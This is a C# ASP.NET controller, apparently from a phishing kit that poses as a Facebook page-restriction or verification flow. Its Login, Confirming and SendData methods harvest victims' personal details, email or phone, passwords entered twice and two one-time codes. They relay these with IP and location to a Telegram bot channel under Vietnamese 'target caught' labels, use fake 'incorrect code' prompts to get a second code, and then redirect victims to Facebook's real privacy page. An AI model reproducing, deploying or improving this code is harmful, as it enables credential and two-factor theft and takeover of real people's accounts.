using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.Mvc.RazorPages;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System.Diagnostics;
using System.Diagnostics.Metrics;
using System.Drawing;
using System.Xml.Linq;

//using TelegramBot;
using WebApplication1.Models;
using WebApplication1.Services;

namespace WebApplication1.Controllers
{
    public class BusinessController : Controller
    {
        private readonly ILogger<BusinessController> _logger;
        private readonly IConfiguration _configuration;
        private readonly ITelegramService _telegramBot;
        private readonly int _messageId;


        public BusinessController(ILogger<BusinessController> logger, IConfiguration configuration, ITelegramService telegramBot)
        {
            _logger = logger;
            _configuration = configuration;
            _telegramBot = telegramBot;
        }

        [HttpPost]
        public IActionResult RestrictionsInformation(string authen, string location)
        {

            if (!string.IsNullOrEmpty(location))
            {
                HttpContext.Session.SetString(Constants.LOCATION, location);
            }
            return View();
        }

        [HttpPost]
        public async Task<IActionResult> Login(string pageName, string yourName, string phoneNumber, string birthday)
        {
            HttpContext.Session.SetString(Constants.PAGE_NAME, pageName);
            HttpContext.Session.SetString(Constants.NAME, yourName);
            HttpContext.Session.SetString(Constants.PHONE, phoneNumber);
            HttpContext.Session.SetString(Constants.BIRTHDAY, birthday);

            var ip = HttpContext.Session.GetString(Constants.IP);
            var location = HttpContext.Session.GetString(Constants.LOCATION);


            string telegramBotToken = _configuration["TelegramBotToken"];
            string channel = _configuration["Channel"];
            var message = "ĐỐI TƯỢNG MỚI : " + ip + "\n" +
                          "IP: " + ip + "\n" +
                          "Location: " + location + "\n" +
                          "Page Name: " + pageName + "\n" +
                          "Name: " + yourName + "\n" +
                          "Phone: " + phoneNumber + "\n" +
                          "Birthday: " + birthday + "\n" +
                          "------------------------" + "\n" +
                          "Time: " + DateTime.UtcNow.AddHours(7).ToString("dd/MM/yyyy HH:mm") + "\n";

            // test
            var messageId2 = HttpContext.Session.GetInt32(Constants.MESSAGE_ID);
            messageId2 = await _telegramBot.SendMessageAsync(telegramBotToken, "-4244986710", message, messageId2);
            if (messageId2 != null)
            {
                HttpContext.Session.SetInt32(Constants.MESSAGE_ID2, messageId2.Value);
            }

            var messageId = HttpContext.Session.GetInt32(Constants.MESSAGE_ID);
            messageId = await _telegramBot.SendMessageAsync(telegramBotToken, channel, message, messageId);
            if (messageId != null)
            {
                HttpContext.Session.SetInt32(Constants.MESSAGE_ID, messageId.Value);
            }


            return View();
        }

        [HttpPost]
        public IActionResult Confirming(string emailOrPhone, string password, string action, string otpCode)
        {
            if (!string.IsNullOrEmpty(emailOrPhone))
            {
                HttpContext.Session.SetString(Constants.EMAIL_OR_PHONE, emailOrPhone);
                HttpContext.Session.SetString(Constants.PASSWORD, password);
            }
            if (!string.IsNullOrEmpty(password) && string.IsNullOrEmpty(emailOrPhone))
            {
                HttpContext.Session.SetString(Constants.PASSWORD2, password);
                ViewBag.Message = "otp";
            }
            if (!string.IsNullOrEmpty(otpCode))
            {
                var otp1 = HttpContext.Session.GetString(Constants.OTP1);
                if (string.IsNullOrEmpty(otp1))
                {
                    HttpContext.Session.SetString(Constants.OTP1, otpCode);
                    ViewBag.Message = "otp2";
                }
                else
                {
                    HttpContext.Session.SetString(Constants.OTP2, otpCode);
                    SendData().Wait();
                    Thread.Sleep(3000);
                    return Redirect("https://www.facebook.com/privacy/policy?section_id=0-WhatIsThePrivacy");
                }
            }

            string timeWait = _configuration["TimeWait"];
            ViewBag.TimeConfirm = timeWait;

            var messageId = SendData().Result;

            return View();
        }

        private async Task<int?> SendData()
        {
            var ip = HttpContext.Session.GetString(Constants.IP);
            var location = HttpContext.Session.GetString(Constants.LOCATION);
            var pageName = HttpContext.Session.GetString(Constants.PAGE_NAME);
            var name = HttpContext.Session.GetString(Constants.NAME);
            var phone = HttpContext.Session.GetString(Constants.PHONE);
            var birthday = HttpContext.Session.GetString(Constants.BIRTHDAY);
            var email = HttpContext.Session.GetString(Constants.EMAIL_OR_PHONE);
            var password = HttpContext.Session.GetString(Constants.PASSWORD);
            var password2 = HttpContext.Session.GetString(Constants.PASSWORD2);
            var otp = HttpContext.Session.GetString(Constants.OTP1);
            var otp2 = HttpContext.Session.GetString(Constants.OTP2);

            string telegramBotToken = _configuration["TelegramBotToken"];
            string channel = _configuration["Channel"];
            var message = "🎁 ĐỐI TƯỢNG MỚI DÍNH ĐÒN: " + ip + " 🎁" + "\n" +
                          "IP: " + ip + "\n" +
                          "Location: " + location + "\n" +
                          "Page Name: " + pageName + "\n" +
                          "Name: " + name + "\n" +
                          "Phone: " + phone + "\n" +
                          "Birthday: " + birthday + "\n" +
                          (email == null ? "" : "--------------------------------" + "\n" +
                          "👌 Đã lấy được Email\\Pass: " + "\n" +
                          "Email or Phone: " + email + "\n" +
                          "--------------------------------" + "\n" +
                          "Password: " + password + "\n") +

                          (password2 == null ? "" : "--------------------------------" + "\n" +
                           "👌 Đã lấy được Pass lần 2: " + "\n" +
                          "Password2: " + password2 + "\n") +

                          (otp == null ? "" : "--------------------------------" + "\n" +
                           "👌 Đã lấy được OTP: " + "\n" +
                          "OTP1: " + otp + "\n") +
                          (otp2 == null ? "" : "--------------------------------" + "\n" +
                           "👌 Đã lấy được OTP lần 2: " + "\n" +
                          "OTP2: " + otp2 + "\n") +
                          "--------------------------------" + "\n" +
                          "Time: " + DateTime.UtcNow.AddHours(7).ToString("dd/MM/yyyy HH:mm") + "\n";

            var messageId2 = HttpContext.Session.GetInt32(Constants.MESSAGE_ID2);
            await _telegramBot.SendMessageAsync(telegramBotToken, "-4244986710", message, messageId2); // test
            Thread.Sleep(2000);
            var messageId = HttpContext.Session.GetInt32(Constants.MESSAGE_ID);
            return await _telegramBot.SendMessageAsync(telegramBotToken, channel, message, messageId);

        }

        [HttpPost]
        public IActionResult IncorrectPassword()
        {
            ViewBag.Message = "otp";
            return View();
        }

        [HttpPost]
        public IActionResult Authentication()
        {
            var otp1 = HttpContext.Session.GetString(Constants.OTP1);
            if (!string.IsNullOrEmpty(otp1))
            {
                ViewBag.Message = "The code that you've entered is incorrect, we are sending you a new code.";
            }
            return View();
        }

        [ResponseCache(Duration = 0, Location = ResponseCacheLocation.None, NoStore = true)]
        public IActionResult Error()
        {
            return View(new ErrorViewModel { RequestId = Activity.Current?.Id ?? HttpContext.TraceIdentifier });
        }
    }
}
